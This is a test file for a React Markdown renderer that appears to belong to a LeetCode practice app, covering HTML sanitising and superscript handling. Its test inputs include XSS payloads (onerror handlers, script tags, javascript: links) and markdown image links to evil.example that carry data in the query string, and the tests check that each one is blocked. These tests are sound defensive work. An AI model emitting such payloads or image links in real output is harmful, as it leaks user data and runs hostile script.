import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown, superscriptsAsCarets } from "./markdown";

const render = (md: string) => renderToStaticMarkup(createElement(Markdown, null, md));
// A problem statement, the one place images may show.
const statement = (md: string) => renderToStaticMarkup(Markdown({ children: md, statementImages: true }));

describe("Markdown", () => {
  it("never renders raw HTML as elements", () => {
    const html = render(`<img src=x onerror=alert(1)> <script>alert(1)</script>`);
    // Stripped, never an actual element or a live event handler.
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("onerror=");
  });

  it("neutralises a javascript: link", () => {
    const html = render("[click](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("keeps a safe link", () => {
    const html = render("[docs](https://example.com)");
    expect(html).toContain("https://example.com");
  });

  it("strips the src from a non-https image, so a tracking pixel never loads", () => {
    const html = render("![tracker](http://tracker.example/p.png)");
    expect(html).not.toContain("http://tracker.example");
  });

  it("never loads an image from Coach or lesson text, even over https; the alt text stays", () => {
    const html = render("![readiness](https://evil.example/p.png?d=readiness-61) and ![x][1]\n\n[1]: https://evil.example/q.png");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("readiness");
  });

  it("loads a problem statement's diagram from LeetCode only", () => {
    expect(statement("![tree](https://assets.leetcode.com/uploads/tree.jpg)")).toContain(
      '<img alt="tree" src="https://assets.leetcode.com/uploads/tree.jpg"',
    );
    const elsewhere = statement("![tree](https://evil.example/tree.jpg?d=1)");
    expect(elsewhere).not.toContain("<img");
    expect(elsewhere).not.toContain("evil.example");
  });
});

// Two Sum's constraints and follow-up, as LeetCode writes them and as the import stores them.
const TWO_SUM_HTML = [
  "* `2 <= nums.length <= 10<sup>4</sup>`",
  "* `-10<sup>9</sup> <= nums[i] <= 10<sup>9</sup>`",
  "",
  "Can you come up with an algorithm that is less than `O(n<sup>2</sup>)` time complexity?",
].join("\n");
const TWO_SUM_STORED = [
  "* `2 <= nums.length <= 10^4`",
  "* `-10^9 <= nums[i] <= 10^9`",
  "",
  "Can you come up with an algorithm that is less than `O(n^2)` time complexity?",
].join("\n");

describe("superscripts", () => {
  it("keeps Two Sum's bounds as powers, not 104 and 109", () => {
    for (const md of [TWO_SUM_HTML, TWO_SUM_STORED]) {
      const html = render(md);
      expect(html).toContain("2 &lt;= nums.length &lt;= 10^4");
      expect(html).toContain("-10^9 &lt;= nums[i] &lt;= 10^9");
      expect(html).toContain("O(n^2)");
      expect(html).not.toMatch(/10[49]\b|n2\)/);
    }
  });

  it("brackets a compound exponent and runs an ordinal together", () => {
    expect(superscriptsAsCarets("2<sup>n - 1</sup> and the i<sup>th</sup> one")).toBe("2^(n - 1) and the ith one");
  });

  it("never lets a tag inside a superscript through", () => {
    const html = render("10<sup><img src=x onerror=alert(1)>4</sup>");
    expect(html).toContain("10^4");
    expect(html).not.toContain("<img");
  });

  it("leaves a fenced code block as written, closed or open to the end", () => {
    const fenced = "Use 10<sup>4</sup>:\n\n```html\n<p>x<sup>2</sup></p>\n```\n\nthen 2<sup>31</sup>.";
    expect(superscriptsAsCarets(fenced)).toBe("Use 10^4:\n\n```html\n<p>x<sup>2</sup></p>\n```\n\nthen 2^31.");
    const tilde = "  ~~~~\n  a<sup>b</sup>\n  ~~~~\nc<sup>d</sup>";
    expect(superscriptsAsCarets(tilde)).toBe("  ~~~~\n  a<sup>b</sup>\n  ~~~~\nc^d");
    const open = "n<sup>2</sup>\n```\nx<sup>2</sup>";
    expect(superscriptsAsCarets(open)).toBe("n^2\n```\nx<sup>2</sup>");
    expect(render("```html\n<sup>2</sup>\n```")).toContain("&lt;sup&gt;2&lt;/sup&gt;");
  });

  it("keeps an empty superscript as its space and Two Sum's -10^9 and 10^-9 as written", () => {
    expect(superscriptsAsCarets("the 2<sup>nd</sup><sup> </sup>type")).toBe("the 2nd type");
    expect(superscriptsAsCarets("-10<sup>9</sup> and 10<sup>-9</sup>")).toBe("-10^9 and 10^-9");
  });
});

describe("code blocks", () => {
  it("clear the inline pill inside a fence with no language, so the edge shade shows", () => {
    const html = render("```\nfor (int right = 0; right < n; ++right) {}\n```");
    expect(html).toMatch(/<pre class="[^"]*scroll-fade-x[^"]*\[&amp;&gt;code\]:bg-transparent/);
  });
});
